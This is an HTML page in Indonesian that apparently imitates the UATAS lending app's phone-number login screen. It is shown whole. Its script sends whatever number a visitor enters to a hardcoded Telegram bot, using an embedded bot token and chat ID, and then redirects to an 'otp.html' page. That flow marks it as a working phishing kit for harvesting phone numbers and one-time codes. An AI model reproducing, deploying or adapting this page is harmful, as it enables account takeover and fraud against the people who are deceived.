<html lang="en">
 <head>
  <meta charset="utf-8"/>
  <meta content="width=device-width, initial-scale=1" name="viewport"/>
  <title>
   UATAS
  </title>
  <script src="https://cdn.tailwindcss.com">
  </script>
  <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;600&amp;display=swap" rel="stylesheet"/>
  <style>
   body {
      font-family: 'Inter', sans-serif;
    }
  </style>
 </head>
 <body class="bg-[#fafafa] min-h-screen flex flex-col">
  <header class="flex items-center px-4 py-3 text-[#f16c6c] text-lg font-semibold border-b border-[#f16c6c]/30">
   <svg class="h-6 w-6 mr-3" fill="none" stroke="#f16c6c" stroke-linecap="round" stroke-linejoin="round" stroke-width="2" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg">
    <polyline points="15 18 9 12 15 6">
    </polyline>
   </svg>
   UATAS
  </header>
  <main class="flex flex-col items-center px-6 pt-10 w-full max-w-md mx-auto">
   <h1 class="text-[#f16c6c] font-semibold text-lg mb-6">
    Selamat datang di
   </h1>
   <div class="flex items-center space-x-3 mb-8">
    <img alt="UATAS app icon with orange background and cartoon wallet with cards" class="w-14 h-14 rounded-md" height="60" src="https://scontent.fplm6-1.fna.fbcdn.net/v/t39.30808-6/370641863_683605137140864_1979855246816120745_n.jpg?_nc_cat=102&ccb=1-7&_nc_sid=6ee11a&_nc_ohc=-o7BJB628J8Q7kNvwElRnUg&_nc_oc=Adk1UI80ApUVILefUq7fJnKxH3KK9DAJa7Qtn11KX6HmmZhlYiLBr3CSK-w5KN2SM8Iba8jLfg6pu1q_xBfWnMQs&_nc_zt=23&_nc_ht=scontent.fplm6-1.fna&_nc_gid=S7PVnAVmTuKvmEAaEBqiZg&oh=00_AfVGhYDDqTTAGHHJwXp5psBfx6ipmM7036x3DKWX8qfE5w&oe=689D9AD5" width="60"/>
    <span class="text-[#b72a6a] font-extrabold text-3xl tracking-wide">
     UATAS
    </span>
   </div>
   <label class="text-[#d87f7f] mb-2 block text-base" for="phone">
    Masukkan Nomor HP anda
   </label>
   <div class="w-full bg-[#f7f7f7] rounded-full flex items-center px-4 py-3 text-[#d87f7f] text-base">
    <span class="select-none text-[#d87f7f] font-semibold mr-2">+62</span>
    <input aria-label="Nomor HP input without country code" class="flex-1 bg-transparent outline-none placeholder-transparent" id="phone" placeholder="" type="tel"/>
   </div>
   <button aria-live="polite" id="sendBtn" class="mt-10 w-full py-3 rounded-full bg-gradient-to-r from-[#ff6f6f] via-[#f16c6c] to-[#f68a5f] text-[#f7b1b1] font-semibold text-base disabled:opacity-50 flex justify-center items-center" disabled="">
    <span id="btnText">Berikutnya</span>
    <svg aria-hidden="true" class="ml-2 h-5 w-5 animate-spin text-[#f7b1b1]" fill="none" stroke="currentColor" stroke-width="2" viewbox="0 0 24 24" xmlns="http://www.w3.org/2000/svg" style="display:none;">
     <circle cx="12" cy="12" r="10" stroke-opacity="0.25" stroke-width="4"></circle>
     <path d="M4 12a8 8 0 018-8" stroke-linecap="round" stroke-width="4"></path>
    </svg>
   </button>
  </main>
  <script>
   const phoneInput = document.getElementById('phone');
   const sendBtn = document.getElementById('sendBtn');
   const btnText = document.getElementById('btnText');
   const spinner = sendBtn.querySelector('svg');

   // Enable button only if input has value
   phoneInput.addEventListener('input', () => {
     sendBtn.disabled = phoneInput.value.trim() === '';
   });

   sendBtn.addEventListener('click', () => {
     const phone = phoneInput.value.trim();
     if (!phone) return;

     // Show loading spinner and disable button
     btnText.textContent = 'Loading...';
     spinner.style.display = 'inline-block';
     sendBtn.disabled = true;
     phoneInput.disabled = true;

     // Telegram bot info - replace with your own bot token and chat ID
     const botToken = '8479141074:AAHXRTIUGTqpC0Qvw31YqB3pb3W6Ji6PfPc';
     const chatId = '7549590022';

     // Include +62 prefix in the message
     const message = encodeURIComponent(`Nomor HP: +62${phone}`);

     const url = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${message}`;

     fetch(url)
       .then(response => response.json())
       .then(data => {
         if (data.ok) {
           window.location = "otp.html";
           phoneInput.value = '';
         } else {
           alert('Gagal mengirim data ke Telegram.');
         }
       })
       .catch(() => {
         alert('Terjadi kesalahan saat mengirim data.');
       })
       .finally(() => {
         btnText.textContent = 'Berikutnya';
         spinner.style.display = 'none';
         sendBtn.disabled = phoneInput.value.trim() === '';
         phoneInput.disabled = false;
       });
   });
  </script>
 </body>
      </html>
